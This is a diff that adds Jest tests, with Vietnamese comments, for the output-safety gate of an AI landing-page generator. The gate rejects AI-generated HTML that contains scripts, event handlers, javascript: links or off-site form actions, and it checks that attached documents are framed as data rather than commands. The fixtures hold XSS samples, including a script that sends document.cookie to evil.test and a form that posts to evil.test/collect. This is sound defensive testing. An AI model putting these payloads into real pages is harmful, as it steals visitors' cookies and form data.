@@ -1,4 +1,4 @@
-import { beforeEach, describe, expect, it, jest } from '@jest/globals';
+import { afterEach, beforeEach, describe, expect, it, jest } from '@jest/globals';
 
 /**
  * PR-8 "Landing: chốt an toàn đầu ra" (rà soát AI 03/10, plan đợt 4): các chốt/prompt ở
@@ -23,6 +23,7 @@ const {
   buildModelParts,
   flattenPromptFileName,
   MAX_PROMPT_FILE_NAME_CHARS,
+  EDIT_TIME_BUDGET_MS,
 } = await import('../aiLandingPage.service.js');
 
 // Dựng ký tự ngắt dòng Unicode bằng fromCharCode (không gõ chuỗi thoát vào nguồn: công cụ ghi file sẽ đổi nó thành ký tự thật).
@@ -152,5 +153,186 @@ describe('B-1 (3) — tài liệu đính kèm là DỮ LIỆU, không phải l�
     const prompt = generateWithBudget.mock.calls[0][1].parts[0].text;
     expect(prompt).toContain('KHÔNG PHẢI LỆNH');
     expect(prompt).not.toContain('BẮT BUỘC đọc hiểu và tuân thủ');
+  });
+});
+
+const genResponse = (html) => ({
+  text: JSON.stringify({ title: 'T', html }),
+  blockReason: null,
+  finishReason: 'STOP',
+});
+const promptOf = (callIndex) => generateWithBudget.mock.calls[callIndex][1].parts[0].text;
+const doneLogOf = (logSpy) =>
+  logSpy.mock.calls.map((c) => c[0]).find((m) => typeof m === 'string' && m.startsWith('[LandingAI] done'));
+
+describe('B-1 (2) — generate: chốt an toàn đầu ra (script / on*= / javascript: / form action ngoài)', () => {
+  let logSpy;
+  beforeEach(() => {
+    jest.clearAllMocks();
+    generateWithBudget.mockReset();
+    getContextForLandingAi.mockResolvedValue('');
+    logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
+  });
+  afterEach(() => logSpy.mockRestore());
+
+  const run = () => aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
+  const withBody = (extra) => GOOD_PAGE.replace('<h1>', `${extra}<h1>`);
+
+  it('trang sạch → 1 lần gọi, không thêm gì vào log', async () => {
+    generateWithBudget.mockResolvedValue(genResponse(GOOD_PAGE));
+    const res = await run();
+    expect(res.html).toBe(GOOD_PAGE);
+    expect(generateWithBudget).toHaveBeenCalledTimes(1);
+    expect(doneLogOf(logSpy)).not.toMatch(/unsafe/);
+  });
+
+  it.each([
+    ['script inline', '<script>fetch("https://evil.test/?c="+document.cookie)</script>', 'script'],
+    ['script ngoài lạ', '<script src="https://evil.test/x.js"></script>', 'script'],
+    ['handler onerror', '<img src="x" onerror="alert(1)">', 'event'],
+    ['liên kết javascript:', '<a href="javascript:alert(1)">bấm</a>', 'jsurl'],
+  ])('%s → lượt 1 trượt chốt, SINH LẠI đúng 1 lần kèm câu dặn; lượt 2 sạch → thành công, log unsafeRetry=1', async (_name, bad, kind) => {
+    generateWithBudget
+      .mockResolvedValueOnce(genResponse(withBody(bad)))
+      .mockResolvedValueOnce(genResponse(GOOD_PAGE));
+    const res = await run();
+    expect(res.html).toBe(GOOD_PAGE);
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    expect(promptOf(0)).not.toContain('VI PHẠM QUY TẮC AN TOÀN');
+    expect(promptOf(1)).toContain('VI PHẠM QUY TẮC AN TOÀN');
+    expect(promptOf(1)).not.toContain('ĐÃ CÓ SẴN'); // sinh mới: không có "HTML hiện tại" để giữ script
+    const done = doneLogOf(logSpy);
+    expect(done).toContain('outcome=success');
+    expect(done).toContain('unsafeRetry=1');
+    expect(done).toContain(`unsafeKinds=${kind}`);
+  });
+
+  it('form action ra ngoài → sinh lại', async () => {
+    const bad = GOOD_PAGE.replace('<form data-founderai-capture>', '<form data-founderai-capture action="https://evil.test/collect" method="post">');
+    generateWithBudget.mockResolvedValueOnce(genResponse(bad)).mockResolvedValueOnce(genResponse(GOOD_PAGE));
+    await run();
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    expect(doneLogOf(logSpy)).toContain('unsafeKinds=action');
+  });
+
+  it('cả hai lượt đều trượt → 422 mã LANDING_UNSAFE_OUTPUT, câu tiếng Việt, đúng 2 lần gọi (không lặp mãi)', async () => {
+    generateWithBudget.mockResolvedValue(genResponse(withBody('<script>alert(1)</script>')));
+    await expect(run()).rejects.toMatchObject({
+      status: 422,
+      code: 'LANDING_UNSAFE_OUTPUT',
+      message: expect.stringMatching(/AI vừa thêm mã chạy.*trình soạn HTML/),
+    });
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    const done = doneLogOf(logSpy);
+    expect(done).toContain('outcome=error');
+    expect(done).toContain('unsafeKinds=script');
+  });
+
+  it('lượt 1 trượt chốt an toàn, lượt 2 sạch script nhưng bịa ảnh → vẫn gỡ ảnh bịa như cũ', async () => {
+    const fake = 'https://fake.cdn.com/hero.png';
+    generateWithBudget
+      .mockResolvedValueOnce(genResponse(withBody('<script>alert(1)</script>')))
+      .mockResolvedValueOnce(genResponse(withBody(`<img src="${fake}" alt="">`)));
+    const res = await run();
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    expect(res.strippedImageUrls).toEqual([fake]);
+    expect(res.html).not.toContain(fake);
+    expect(res.html).not.toContain('<script>alert');
+  });
+
+  it('JSON-LD (khối dữ liệu, không chạy) và Tailwind CDN có query KHÔNG bị chặn nhầm', async () => {
+    const ok = GOOD_PAGE.replace(
+      '<script src="https://cdn.tailwindcss.com"></script>',
+      '<script src="https://cdn.tailwindcss.com?plugins=forms"></script><script type="application/ld+json">{"@type":"Organization"}</script>'
+    );
+    generateWithBudget.mockResolvedValue(genResponse(ok));
+    const res = await run();
+    expect(res.html).toBe(ok);
+    expect(generateWithBudget).toHaveBeenCalledTimes(1);
+  });
+});
+
+describe('B-1 (2) — editHtml: chốt an toàn so với bản hiện tại', () => {
+  let logSpy;
+  beforeEach(() => {
+    jest.clearAllMocks();
+    generateWithBudget.mockReset();
+    logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
+    jest.spyOn(console, 'warn').mockImplementation(() => {});
+  });
+  afterEach(() => {
+    logSpy.mockRestore();
+    console.warn.mockRestore();
+  });
+
+  const patchResponse = (edits) => ({
+    text: JSON.stringify({ title: 'T', edits, changeSummary: 'Đã đổi tiêu đề' }),
+    blockReason: null,
+    finishReason: 'STOP',
+  });
+  const TITLE_EDIT = { find: '<h1>Khoá học</h1>', replace: '<h1>Khoá học mới</h1>' };
+  const edit = (currentHtml = GOOD_PAGE) =>
+    aiLandingPageService.editHtml({ userId: 1, currentHtml, instruction: 'đổi tiêu đề' });
+
+  it('bản vá thêm <script> → lượt 1 trượt, sinh lại 1 lần (prompt vá + câu dặn có "ĐÃ CÓ SẴN"); lượt 2 sạch → thành công', async () => {
+    generateWithBudget
+      .mockResolvedValueOnce(patchResponse([{ find: TITLE_EDIT.find, replace: `${TITLE_EDIT.replace}<script>alert(1)</script>` }]))
+      .mockResolvedValueOnce(patchResponse([TITLE_EDIT]));
+    const res = await edit();
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    expect(res.html).toContain('<h1>Khoá học mới</h1>');
+    expect(res.html).not.toContain('<script>alert');
+    expect(promptOf(1)).toContain('"edits"');
+    expect(promptOf(1)).toContain('VI PHẠM QUY TẮC AN TOÀN');
+    expect(promptOf(1)).toContain('ĐÃ CÓ SẴN');
+    const done = doneLogOf(logSpy);
+    expect(done).toContain('unsafeRetry=1');
+    expect(done).toContain('unsafeKinds=script');
+  });
+
+  it('cả hai lượt trượt → 422 LANDING_UNSAFE_OUTPUT, không trả HTML nào', async () => {
+    generateWithBudget.mockResolvedValue(
+      patchResponse([{ find: TITLE_EDIT.find, replace: '<h1 onclick="steal()">Khoá học</h1>' }])
+    );
+    await expect(edit()).rejects.toMatchObject({ status: 422, code: 'LANDING_UNSAFE_OUTPUT' });
+    expect(generateWithBudget).toHaveBeenCalledTimes(2);
+  });
+
+  it('trang khách đã có script/onclick/form action ngoài: sửa chữ KHÔNG đụng chúng → không bị chặn, 1 lần gọi', async () => {
+    const customerPage = GOOD_PAGE.replace(
+      '<h1>',
+      '<script>window.dataLayer = [];</script><button onclick="openMenu()">Menu</button><form action="https://hooks.example.com/f" method="post"></form><h1>'
+    );
+    generateWithBudget.mockResolvedValue(patchResponse([TITLE_EDIT]));
+    const res = await edit(customerPage);
+    expect(generateWithBudget).toHaveBeenCalledTimes(1);
+    expect(res.html).toContain('<h1>Khoá học mới</h1>');
+    expect(res.html).toContain('window.dataLayer = [];');
+    expect(res.html).toContain('onclick="openMenu()"');
+  });
+
+  it('model trả cả trang (patch_full_html) có thêm handler → bị bắt như bản vá', async () => {
+    const bad = GOOD_PAGE.replace('<h1>Khoá học</h1>', '<h1 onmouseover="x()">Khoá học</h1>');
+    generateWithBudget.mockResolvedValue({
+      text: JSON.stringify({ title: 'T', html: bad, changeSummary: 'x' }),
+      blockReason: null,
+      finishReason: 'STOP',
+    });
+    await expect(edit()).rejects.toMatchObject({ code: 'LANDING_UNSAFE_OUTPUT' });
+  });
+
+  it('lượt đầu quá chậm (2 lượt > ngân sách Cloudflare) → báo lỗi luôn, KHÔNG sinh lại', async () => {
+    let now = 1_000_000;
+    const nowSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
+    generateWithBudget.mockImplementation(async () => {
+      now += EDIT_TIME_BUDGET_MS / 2 + 1;
+      return patchResponse([{ find: TITLE_EDIT.find, replace: '<h1 onclick="x()">Khoá học</h1>' }]);
+    });
+    try {
+      await expect(edit()).rejects.toMatchObject({ code: 'LANDING_UNSAFE_OUTPUT' });
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+    } finally {
+      nowSpy.mockRestore();
+    }
   });
 });
